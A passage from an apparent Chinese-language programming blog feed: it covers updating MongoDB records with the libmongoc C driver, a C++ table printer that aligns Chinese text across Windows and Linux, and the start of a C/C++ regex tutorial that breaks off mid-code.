class="hljs-selector-attr">[ &#123; <span class="hljs-string">&quot;country&quot;</span> : <span class="hljs-string">&quot;China&quot;</span> &#125;, &#123; <span class="hljs-string">&quot;phone&quot;</span> : <span class="hljs-string">&quot;110&quot;</span> &#125; ]</span> &#125;<br><br></code></pre></div></td></tr></table></figure>
<p>要修改 age 大或等于 12 的 name 的<strong>所有</strong>记录，那么我么可以这样做<br />
db.test.update({‘age’:{‘<span class='katex-error' title='ParseError: KaTeX parse error: Expected &#039;EOF&#039;, got &#039;}&#039; at position 8: gte’:12}̲},{‘'>gte’:12}},{‘</span>set’:{‘name’:’XXXXX’}},false,<strong>true</strong>)</p>
<p>类似与MySQL：update tb_xxx set name=’xxxxx’ where age &gt;=12</p>
<p>这时候回过头来看看</p>
<figure class="highlight dart"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs dart"><span class="hljs-keyword">const</span> bson_t *selector =&gt; &#123;<span class="hljs-string">&#x27;age&#x27;</span>:&#123;<span class="hljs-string">&#x27;<span class="hljs-subst">$gte</span>&#x27;</span>:<span class="hljs-number">12</span>&#125; &#125;<br><span class="hljs-keyword">const</span> bson_t *update =&gt; &#123;<span class="hljs-string">&#x27;<span class="hljs-subst">$set</span>&#x27;</span>:&#123;<span class="hljs-string">&#x27;name&#x27;</span>:<span class="hljs-string">&#x27;XXXXX&#x27;</span>&#125;&#125;<br>mongoc_update_flags_t flags =&gt; MONGOC_UPDATE_MULTI_UPDATE<br></code></pre></div></td></tr></table></figure>
<p>于是可以这样写</p>
<figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-keyword">bson_t</span> *query=<span class="hljs-built_in">BCON_NEW</span>(<span class="hljs-string">&quot;age&quot;</span>,<span class="hljs-string">&quot;&#123;&quot;</span>,<br>                      <span class="hljs-string">&quot;$gte&quot;</span>,<span class="hljs-built_in">BCON_INT32</span>(<span class="hljs-number">12</span>),<br>                             <span class="hljs-string">&quot;&#125;&quot;</span>);<br><span class="hljs-keyword">bson_t</span> *update=<span class="hljs-built_in">BCON_NEW</span>(<span class="hljs-string">&quot;$set&quot;</span>,<span class="hljs-string">&quot;&#123;&quot;</span>,<br>                       <span class="hljs-string">&quot;age&quot;</span>,<span class="hljs-built_in">BCON_INT32</span>(<span class="hljs-number">888</span>),<br>                              <span class="hljs-string">&quot;&#125;&quot;</span>);<br><span class="hljs-keyword">bool</span> retr= <span class="hljs-built_in">mongoc_collection_update</span>(coll,MONGOC_UPDATE_MULTI_UPDATE,query,update,<span class="hljs-literal">NULL</span>,&amp;error);<br><span class="hljs-keyword">if</span>(!retr)&#123;<br>     	cout&lt;&lt;error.message&lt;&lt;endl;<br>&#125;<br><span class="hljs-built_in">bson_destroy</span>(query);<br><span class="hljs-built_in">bson_destroy</span>(update);<br><br></code></pre></div></td></tr></table></figure>
<p>注意，<strong>“age”,”{“</strong> 要单独写，不能写成 <strong>“age{“</strong>，否则 <strong>src/bson/bcon.c:784 bcon_append_ctx_va(): precondition failed: type == BCON_TYPE_UTF8</strong> 这是最坑爹的地方</p>
<h4 id="内存释放"><a class="markdownIt-Anchor" href="#内存释放"></a> 内存释放</h4>
<p>别以为这样就结束了哦，还要记得要释放所有的内存</p>
<figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-comment">// 释放char*指针</span><br><span class="hljs-built_in">bson_free</span>(<span class="hljs-keyword">void</span> *mem);<br><span class="hljs-comment">// 释放 bson_t *bson文档</span><br><span class="hljs-built_in">bson_destroy</span>(<span class="hljs-keyword">bson_t</span> *bson);<br><span class="hljs-built_in">mongoc_cursor_destroy</span>(cursor);<br><span class="hljs-built_in">mongoc_collection_destroy</span>(coll);<br><span class="hljs-built_in">mongoc_database_destroy</span>(database);<br><span class="hljs-built_in">mongoc_client_destroy</span>(client);<br><span class="hljs-built_in">mongoc_cleanup</span>();<br></code></pre></div></td></tr></table></figure>
<h3 id="编译"><a class="markdownIt-Anchor" href="#编译"></a> 编译</h3>
<p>编译方法也很简单</p>
<blockquote>
<p>g++ main.cpp -o main <code>pkg-config –libs –cflags libmongoc-1.0</code></p>
</blockquote>
<p>或者</p>
<blockquote>
<p>g++ main.cpp -o main -lbson-1.0 -lmongoc-1.0</p>
</blockquote>
<h3 id="结尾"><a class="markdownIt-Anchor" href="#结尾"></a> 结尾</h3>
<p>不得不说，用mongoc来操控mongoDB数据库还挺复杂的。因此建议自己把这些函数封装成类对象。其实，关于mongoc封装成类，<strong>Mongoc</strong>目前已经发展到了<strong>MongoCXX</strong>，以Mongoc为基础，所有操作都被封装到类里面。引入了几个特殊的对象 <strong>view、value、view_or_value</strong>。同时，构建(<strong>Build</strong>)一个BSON文档有两种方法：<strong>basic、stream</strong>。可 <a href="https://mongodb.github.io/mongo-cxx-driver/mongocxx-v3/installation/">参阅这里</a></p>
<p>以后有空再介绍***mongocxx***吧～</p>
<p>参考 <a href="http://mongoc.org/libmongoc/current/tutorial.html">http://mongoc.org/libmongoc/current/tutorial.html</a></p>
]]></content>
      <categories>
        <category>MongoDB</category>
      </categories>
      <tags>
        <tag>C++</tag>
        <tag>Linux</tag>
        <tag>C</tag>
        <tag>MongoDB</tag>
      </tags>
  </entry>
  <entry>
    <title>C++简单实现MySQL表格输出功能</title>
    <url>/cpp-printtable/</url>
    <content><![CDATA[<p>其实在很早之前，我就对MySQL的表格输出很感兴趣并想用C++实现，主要是因为它支持中文输出。因此前一段时间我实现了第一版的MyPrettyTable(简化版的Python的库PrettyTable?)，然而令人失望的是它在含有中文汉字的情况下会发生混乱而无法对齐，于是我放弃了。不过昨天在写代码时偶然看到之前那个被搁置的project，于是不甘心的我再次重新实现了这个功能…其实就是利用的setw和left</p>
<span id="more"></span>
<h2 id="python中的prettytable"><a class="markdownIt-Anchor" href="#python中的prettytable"></a> Python中的PrettyTable</h2>
<p>用C++写MyPrettyTable的代码格式是按照Python中的PrettyTable。因此MyPrettyTable相对来说比较简单</p>
<h2 id="中文汉字处理问题"><a class="markdownIt-Anchor" href="#中文汉字处理问题"></a> 中文汉字处理问题</h2>
<p>由于UTF-8编码是变长编码，通常汉字占三个字节，而英文占一个字节<br />
在终端下显示汉字占两个字符宽，而英文字母只占一个字符宽</p>
<p>比如 <code>string s = &quot;好&quot;;</code><br />
在Linux下 s.size() = 3  在Windows下 s.size() = 2<br />
再比如下面的代码</p>
<figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp">string s1 = <span class="hljs-string">&quot;你好世界&quot;</span>;<br>string s2 = <span class="hljs-string">&quot;你好世&quot;</span>;<br>string s3 = <span class="hljs-string">&quot;你好&quot;</span>;<br><span class="hljs-keyword">int</span> size = s1.<span class="hljs-built_in">size</span>();<br>cout &lt;&lt; size &lt;&lt; endl;<br><br>cout.<span class="hljs-built_in">fill</span>(<span class="hljs-string">&#x27;.&#x27;</span>);<br>cout &lt;&lt; left &lt;&lt; <span class="hljs-built_in">setw</span>(size) &lt;&lt; <span class="hljs-string">&quot;&quot;</span> &lt;&lt; endl;<br>cout &lt;&lt; left &lt;&lt; <span class="hljs-built_in">setw</span>(size) &lt;&lt; s1 &lt;&lt; endl;<br>cout &lt;&lt; left &lt;&lt; <span class="hljs-built_in">setw</span>(size) &lt;&lt; s2 &lt;&lt; endl;<br>cout &lt;&lt; left &lt;&lt; <span class="hljs-built_in">setw</span>(size) &lt;&lt; s3 &lt;&lt; endl;<br></code></pre></div></td></tr></table></figure>
<p>在Windows下</p>
<figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk"><span class="hljs-number">8</span><br>........    <span class="hljs-regexp">//</span><span class="hljs-number">8</span>  <br>你好世界    <span class="hljs-regexp">//</span> <span class="hljs-number">2</span>x4=<span class="hljs-number">8</span><br>你好世..    <span class="hljs-regexp">//</span> <span class="hljs-number">2</span>x3+<span class="hljs-number">2</span>=<span class="hljs-number">8</span><br>你好....	 <span class="hljs-regexp">//</span> <span class="hljs-number">2</span>x2+<span class="hljs-number">4</span>=<span class="hljs-number">8</span><br></code></pre></div></td></tr></table></figure>
<p>然而在Linux下面却是</p>
<figure class="highlight lasso"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs lasso"><span class="hljs-number">12</span><br><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span> <span class="hljs-comment">//12</span><br>你好世界xxxx  <span class="hljs-comment">// 3x4=12</span><br>你好世<span class="hljs-params">...</span>xxx  <span class="hljs-comment">// 3x3+3=12</span><br>你好<span class="hljs-params">...</span><span class="hljs-params">...</span>xx   <span class="hljs-comment">// 3x2+6=12</span><br></code></pre></div></td></tr></table></figure>
<p>因此在Windows下，输出中文能够很好的对齐，但在Linux下就不是这样了。<br />
Windows下的显示中文字符宽恰好是两个英文字母，而Linux下显示中文字符宽等于两个英文字母，但是编码时却是占3个字节！</p>
<p>当我将上面Linux下没有对齐的内容用 x 填充后发现  <strong>不足的填充 x 的个数等于中文汉字的个数</strong>！<br />
于是为了解决这个不对齐问题，我在处理setw()是采用了WIN32/__linux__宏区分不同的平台</p>
<figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-built_in">padding_left</span>(<span class="hljs-keyword">this</span>-&gt;m_ColumnsContent_max_len[i] + _get_Chinese_len(str));<br><span class="hljs-meta">#<span class="hljs-meta-keyword">ifdef</span> WIN32</span><br>        <span class="hljs-built_in">padding_left</span>(<span class="hljs-keyword">this</span>-&gt;m_ColumnsContent_max_len[i]);<br><span class="hljs-meta">#<span class="hljs-meta-keyword">elif</span> __linux__</span><br>        <span class="hljs-built_in">padding_left</span>(<span class="hljs-keyword">this</span>-&gt;m_ColumnsContent_max_len[i] + _get_Chinese_len(str));<br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br></code></pre></div></td></tr></table></figure>
<p>此时中文汉字的处理问题得以解决，但是如果还有其他一些中文标点符号呢？或者说怎么判断是否存在中文或中文标点符号呢？</p>
<p>因此我定义一个Sign.h头文件用于存放那些特殊的符号，以下为对应中文标点符号的unicode码</p>
<figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><br><span class="hljs-meta">#<span class="hljs-meta-keyword">ifndef</span> PRETTYTABLE_SIGN_H</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> PRETTYTABLE_SIGN_H</span><br><span class="hljs-comment">// special punctuation character</span><br><span class="hljs-class"><span class="hljs-keyword">enum</span>&#123;</span><br>    PC1=<span class="hljs-number">0x3002</span>u,<br>    PC2=<span class="hljs-number">0xFF1F</span>u,<br>    PC3=<span class="hljs-number">0xFF01</span>u,<br>    PC4=<span class="hljs-number">0xFF0C</span>u,<br>    PC5=<span class="hljs-number">0x3001</span>u,<br>    PC6=<span class="hljs-number">0xFF1B</span>u,<br>    PC7=<span class="hljs-number">0xFF1A</span>u,<br>    PC8=<span class="hljs-number">0x300C</span>u,<br>    PC9=<span class="hljs-number">0x300D</span>u,<br>    PC10=<span class="hljs-number">0x2018</span>u,<br>    PC11=<span class="hljs-number">0x2019</span>u,<br>    PC12=<span class="hljs-number">0xFF08</span>u,<br>    PC13=<span class="hljs-number">0xFF09</span>u,<br>    PC14=<span class="hljs-number">0x3014</span>u,<br>    PC15=<span class="hljs-number">0x3015</span>u,<br>    PC16=<span class="hljs-number">0x3010</span>u,<br>    PC17=<span class="hljs-number">0x3011</span>u,<br>    PC18=<span class="hljs-number">0x2014</span>u,<br>    PC19=<span class="hljs-number">0x2026</span>u,<br>    PC20=<span class="hljs-number">0x2013</span>u,<br>    PC21=<span class="hljs-number">0xFF0E</span>u,<br>    PC22=<span class="hljs-number">0x300A</span>u,<br>    PC23=<span class="hljs-number">0x300B</span>u,<br>    PC24=<span class="hljs-number">0x3008</span>u,<br>    PC25=<span class="hljs-number">0x3009</span>u,<br>&#125;;<br><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-keyword">class</span> <span class="hljs-title">Sign</span>&#123;</span><br>    PT_PLUS=<span class="hljs-string">&#x27;+&#x27;</span>, <br>    PT_H =<span class="hljs-string">&#x27;-&#x27;</span>, <br>    PT_V =<span class="hljs-string">&#x27;|&#x27;</span>, <br>    PT_DOT= <span class="hljs-string">&#x27;.&#x27;</span>, <br>    PT_EQUAL= <span class="hljs-string">&#x27;=&#x27;</span> ,<br>    PT_SIG_1= <span class="hljs-string">&#x27;@&#x27;</span> ,<br>    PT_SIG_2= <span class="hljs-string">&#x27;#&#x27;</span> ,<br>    PT_SIG_3= <span class="hljs-string">&#x27;$&#x27;</span>, <br>    PT_SIG_4= <span class="hljs-string">&#x27;%&#x27;</span>, <br>    PT_SIG_5= <span class="hljs-string">&#x27;\\&#x27;</span>, <br>    PT_SIG_6=<span class="hljs-string">&#x27;*&#x27;</span>, <br>    PT_SIG_7=<span class="hljs-string">&#x27;/&#x27;</span><br>&#125;;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br></code></pre></div></td></tr></table></figure>
<p>判断一个字符串中是否存在中文且存在多少个中文汉字或标点符号，我们需要将其转化为wchar_t 指针类型的字符串，函数StringToWString讲一个string类型字符串转化为wstring类型字符串。需要注意的是在Windows下mbstowcs是不安全的，需要替换为mbstowcs_s，不过这里我简单的禁止了该错误</p>
<figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">ifdef</span> WIN32</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> <span class="hljs-meta-keyword">warning</span>(disable:4996)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br><br><span class="hljs-function">wstring <span class="hljs-title">PrettyTable::StringToWString</span><span class="hljs-params">(<span class="hljs-keyword">const</span> string &amp; str)</span></span>&#123;<br>    <span class="hljs-keyword">size_t</span> nLen=str.<span class="hljs-built_in">length</span>()*<span class="hljs-number">2</span>;<br>    <span class="hljs-built_in">setlocale</span>(LC_CTYPE,<span class="hljs-string">&quot;&quot;</span>);<br>    <span class="hljs-keyword">wchar_t</span> *wcs=<span class="hljs-keyword">new</span> <span class="hljs-keyword">wchar_t</span>[nLen];<br>    <span class="hljs-built_in">wmemset</span>(wcs,<span class="hljs-number">0</span>,nLen);<br>    <span class="hljs-keyword">size_t</span> s;<br>    <span class="hljs-built_in">mbstowcs</span>(wcs,str.<span class="hljs-built_in">c_str</span>(),nLen);<br>    wstring w=wcs;<br>    <span class="hljs-keyword">delete</span>[]wcs;<br>    <span class="hljs-keyword">return</span> w;<br>&#125;<br></code></pre></div></td></tr></table></figure>
<p>判断字符串中中文汉字和标点符号数目</p>
<figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-keyword">int</span> PrettyTable::_get_Chinese_len(<span class="hljs-keyword">const</span> string&amp; str)&#123;<br>    wstring ss=<span class="hljs-built_in">StringToWString</span>(str);<br>    <span class="hljs-keyword">int</span> sum=<span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt;ss.<span class="hljs-built_in">length</span>() ; ++i) &#123;<br>        <span class="hljs-keyword">wchar_t</span> wcs=ss.<span class="hljs-built_in">c_str</span>()[i];<br>        <span class="hljs-keyword">if</span>((wcs&gt;=<span class="hljs-number">0x4E00</span>u&amp;&amp;wcs&lt;=<span class="hljs-number">0x9FFF</span>u)<br> ||wcs==PC1||wcs==PC2||wcs==PC3||wcs==PC4||wcs==PC5||wcs==PC6||wcs==PC7||wcs==PC8||wcs==PC9  ||wcs==PC10||wcs==PC11||wcs==PC12||wcs==PC13||wcs==PC14||wcs==PC15||wcs==PC16||wcs==PC17<br> ||wcs==PC18||wcs==PC19||wcs==PC20||wcs==PC21||wcs==PC22||wcs==PC23||wcs==PC24||wcs==PC25)&#123;<br>            sum++;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> sum;<br>&#125;<br></code></pre></div></td></tr></table></figure>
<h2 id="添加header-_draw_header"><a class="markdownIt-Anchor" href="#添加header-_draw_header"></a> 添加Header &amp;  _draw_header</h2>
<p>在添加一个Header时，我就获取其表头(列)的数目，并添加到 <code>this-&gt;m_multiColumns</code> 中，后续再每添加一行row时同时还要将row转化为column并在添加到<code>this-&gt;m_multiColumns</code>中，为的是 <strong>获取每一列中字符串的最大宽度</strong> 使得整个表格对齐。</p>
<p>比如我要画一个表格头，我是按照一行一行去输出相应的数据并重定向到内部的 <code>stringstream m_innerOss</code><br />
注意的是，每个表头内边距为1个空格，因此我还定义了一个</p>
<figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> PADDING_LEFT_RIGHT 2</span><br></code></pre></div></td></tr></table></figure>
<p>表示内边距的大小</p>
<figure class="highlight asciidoc"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs asciidoc"><span class="hljs-code">+----+</span>------------------<span class="hljs-code">+----------+</span>----------<span class="hljs-code">+---------------------+</span><br><span class="hljs-section">| xx | xx               | xx       | xx       | xx                  |</span><br><span class="hljs-section">+----+------------------+----------+----------+---------------------+</span><br></code></pre></div></td></tr></table></figure>
<h2 id="添加rows-_draw_rows"><a class="markdownIt-Anchor" href="#添加rows-_draw_rows"></a> 添加Rows &amp;  _draw_rows</h2>
<p>这里我想说的是<br />
set()中可以有两种写法</p>
<figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-built_in">setw</span>() = MaxSizeStr + String.<span class="hljs-built_in">Size</span>() - <span class="hljs-built_in">StringCapacity</span>(String)<br><span class="hljs-built_in">setw</span>() = MaxSizeStr + <span class="hljs-built_in">Length</span>(Chinese hans)<br></code></pre></div></td></tr></table></figure>
<p>也就是说 setw()应该设置的值为 <strong>每一个this-&gt;m_multiColumns 中最大字符串宽度+中文汉字/标点符号数目</strong><br />
这个 StringCapacity 函数就是获取字符串中显示的字符宽度 &lt;= string.size()</p>
<figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">PrettyTable::StringCapacity</span><span class="hljs-params">(<span class="hljs-keyword">const</span> string &amp; raw_str)</span></span>&#123;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">ifdef</span> WIN32</span><br>    <span class="hljs-keyword">return</span> raw_str.<span class="hljs-built_in">size</span>();<br><span class="hljs-meta">#<span class="hljs-meta-keyword">elif</span> __linux__</span><br>    <span class="hljs-keyword">return</span> raw_str.<span class="hljs-built_in">size</span>() - <span class="hljs-keyword">this</span>-&gt;_get_Chinese_len(raw_str);<br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br>&#125;<br></code></pre></div></td></tr></table></figure>
<h2 id="结尾"><a class="markdownIt-Anchor" href="#结尾"></a> 结尾</h2>
<p>我已经把代码放在 <a href="https://github.com/josexy/MyPrettyTable/">Github</a> 上了，可以去看看代码，虽然写得有点糟… 不过核心部分还是利用C++的setw和left。<br />
这个project算是到此结束了吧，不过以后有没有可能再继续添加一些东西就不知道了…</p>
<p>图片展示如下</p>
<p><img src="/uploads/images/cpp_table/photo_linux.png" alt="image" /></p>
<p><img src="/uploads/images/cpp_table/photo_windows.png" alt="image" /></p>
]]></content>
      <categories>
        <category>Programming</category>
      </categories>
      <tags>
        <tag>C++</tag>
      </tags>
  </entry>
  <entry>
    <title>C/C++正则表达式regex</title>
    <url>/cpp-regex/</url>
    <content><![CDATA[<p>最近接触了C++的正则表达式,感觉还可以,以此来记录下过程</p>
<span id="more"></span>
<h3 id="正文"><a class="markdownIt-Anchor" href="#正文"></a> 正文</h3>
<p>关于C++的正则表达式头文件,可以参考这个网站的教程http://www.cplusplus.com/reference/regex/</p>
<p>C正则表达式头文件<strong>regex.h</strong><br />
<a href="http://pubs.opengroup.org/onlinepubs/7908799/xsh/regex.h.html">http://pubs.opengroup.org/onlinepubs/7908799/xsh/regex.h.html</a></p>
<p>代码如下</p>
<figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;regex.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;regex&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-comment">//c语言形式的正则表达式</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">cRegex</span><span class="hljs-params">()</span></span>&#123;<br>    <span class="hljs-keyword">regex_t</span> r;<br>    <span class="hljs-comment">//成功返回0(REG_NOERROR)</span><br>    <span class="hljs-keyword">int</span> ret=<span class="hljs-built_in">regcomp</span>(&amp;r,<span class="hljs-string">&quot;abc(.*?)-(.*?)xyz&quot;</span>,REG_EXTENDED|REG_ICASE);<br>    <span class="hljs-keyword">if</span>(ret==<span class="hljs-number">0</span>)&#123;<br>        <span class="hljs-keyword">regmatch_t</span> pm[<span class="hljs-number">10</span>];<br>        <span class="hljs-keyword">char</span> src[]=<span class="hljs-string">&quot;abcQQQQQQ-5555555xyz&quot;</span>;<br>        ret=<span class="hljs-built_in">regexec</span>(&amp;r,src,<span class="hljs-number">10</span>,pm,<span class="hljs-number">0</span>);<br>        <span class="hljs-keyword">if</span>(ret!=REG_NOMATCH&amp;&amp;ret==REG_NOERROR)&#123;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt;<span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(pm)/<span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(<span class="hljs-keyword">regmatch_t</span>); ++i) &#123;<br>                <span 